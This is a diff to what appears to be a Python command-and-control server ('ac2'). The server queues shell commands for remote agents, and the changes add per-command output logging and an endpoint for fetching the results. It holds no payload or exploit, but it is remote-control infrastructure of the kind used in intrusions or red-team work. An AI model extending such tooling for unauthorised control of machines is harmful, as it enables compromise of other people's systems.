@@ -14,8 +14,8 @@ SERVER_PORT = 4444
 # Flask stuff
 app = Flask(__name__)
 app.secret_key = "ac2_secret"
-log = logging.getLogger('werkzeug')
-log.disabled = True
+#log = logging.getLogger('werkzeug')
+#log.disabled = True
 
 # Set up server logging
 logger = logging.getLogger(__name__)
@@ -35,6 +35,7 @@ class Agent:
         self.ip = ip
         self.hostname = hostname
         self.command_queue = queue.Queue()
+        self.curr_cmd_id = 1
 
 # Function to handle client connections
 def handle_client(client_socket, client_address):
@@ -90,7 +91,18 @@ def handle_client(client_socket, client_address):
                     
                     # Extract and display the output up to the delimiter
                     output = buffer.partition(b'ac2delim')[0].decode()
-                    print(f"Output from {client_address}:\n{output}")
+                    
+                    # Log output
+                    if not os.path.exists("cmd_output"):
+                        os.mkdir("cmd_output")
+                    path = "cmd_output/" + f"agent{agent.id}-{agent.curr_cmd_id}.out"
+                    with open(path, 'w') as file:
+                        file.write(command)
+                        file.write(f"Output:\n-------------------------------------------------------------------------------------\n")
+                        file.write(output)
+
+                    # Update cmd id
+                    agent.curr_cmd_id += 1
                 else:
                     break
         except Exception as e:
@@ -188,11 +200,28 @@ def send_command():
 
     if agent:
         agent.command_queue.put(command + "\n")
-        # Wait until the output is received
-        # This is simplified for the sake of example; a more robust setup might be asynchronous
-        response_output = agent.output  # Assuming `output` has been updated by the client response
+        return jsonify({"success": True})
+    else:
+        return jsonify({"success": False, "error": "Invalid agent ID"}), 400
 
-        return jsonify({"success": True, "output": response_output})
+@app.route("/retrieve_output", methods=["POST"])
+def retrieve_output():
+    data = request.get_json()
+    agent_id = int(data["agent_id"])
+    cmd_id = int(data["cmd_id"])
+    agent = registered_agents_id[agent_id]
+
+    path = "cmd_output/" + f"agent{agent.id}-{cmd_id}.out"
+    try:
+        with open(path, 'r') as file:
+            output_lines = file.readlines()
+    except FileNotFoundError:
+        output_lines = ["Output file not found."]
+
+    output = "\n".join(output_lines)
+
+    if agent:
+        return jsonify({"success": True, "output": output})
     else:
         return jsonify({"success": False, "error": "Invalid agent ID"}), 400
 
